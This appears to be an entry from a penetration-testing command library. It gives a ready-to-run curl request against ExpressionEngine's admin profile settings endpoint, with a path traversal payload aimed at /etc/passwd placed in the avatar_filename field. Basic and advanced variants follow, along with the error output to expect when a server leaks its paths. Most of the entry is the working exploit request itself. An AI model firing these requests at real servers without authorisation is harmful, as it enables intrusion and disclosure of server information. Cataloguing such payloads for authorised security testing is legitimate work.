---
id: cmd-uuid-placeholder
data: >-
  curl -X POST
  'http://target.com/ee/admin.php?/cp/members/profile/settings&id=1' -H
  'Content-Type: multipart/form-data' -F 'csrf_token=your_csrf_token' -F
  'url=http://example.com' -F 'location=US' -F 'bday=1990-01-01' -F 'bio=Test
  bio' -F 'language=en' -F 'preferences[]=option1' -F
  'avatar_filename=../../../../../../etc/passwd'
tags:
  - web
  - exploit
  - path-traversal
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:06.069Z'
verified: false
validated: true
submitted: true
---
# curl-expressionengine-path-traversal

## Command

```bash
curl -X POST 'http://target.com/ee/admin.php?/cp/members/profile/settings&id=1' \
  -H 'Content-Type: multipart/form-data' \
  -F 'csrf_token=your_csrf_token' \
  -F 'url=http://example.com' \
  -F 'location=US' \
  -F 'bday=1990-01-01' \
  -F 'bio=Test bio' \
  -F 'language=en' \
  -F 'preferences[]=option1' \
  -F 'avatar_filename=../../../../../../etc/passwd'
```

## Description

This curl command sends a multipart/form-data POST request to ExpressionEngine's admin profile settings endpoint, injecting a path traversal payload into the avatar_filename parameter to trigger an information disclosure exception. Use it during authenticated admin sessions to test for server path leaks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `http://target.com/ee/admin.php?/cp/members/profile/settings&id=1` | Target endpoint URL with user ID | Yes |
| `-H 'Content-Type: multipart/form-data'` | Sets the content type for file-like uploads | Yes |
| `-F 'csrf_token=your_csrf_token'` | CSRF protection token from the session | Yes |
| `-F 'avatar_filename=../../../../../../etc/passwd'` | Path traversal payload to trigger exception | Yes |
| Other `-F` fields (url, location, etc.) | Legitimate form data to mimic normal edit | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'http://target.com/ee/admin.php?/cp/members/profile/settings&id=1' -H 'Content-Type: multipart/form-data' -F 'csrf_token=abc123' -F 'avatar_filename=../../../../../../etc/passwd'
```

### Advanced Usage

```bash
curl -X POST 'https://target.com/ee/admin.php?/cp/members/profile/settings&id=1' -H 'Cookie: admin_session=xyz' -H 'Content-Type: multipart/form-data' -F 'csrf_token=abc123' -F 'bio=Test' -F 'avatar_filename=../../../../../../etc/passwd' -v
```

## Expected Output

The command returns an HTTP response with an error page if vulnerable, including stack trace details like "PHP Fatal error: Failed opening required '/var/www/html/ee/../../../../../../etc/passwd'" revealing server paths and code snippets. Successful non-vulnerable responses may redirect or show form errors without leaks.

## Related

- [[Related Procedure|procedures/Trigger-Path-Traversal-in-ExpressionEngine-Profile]]
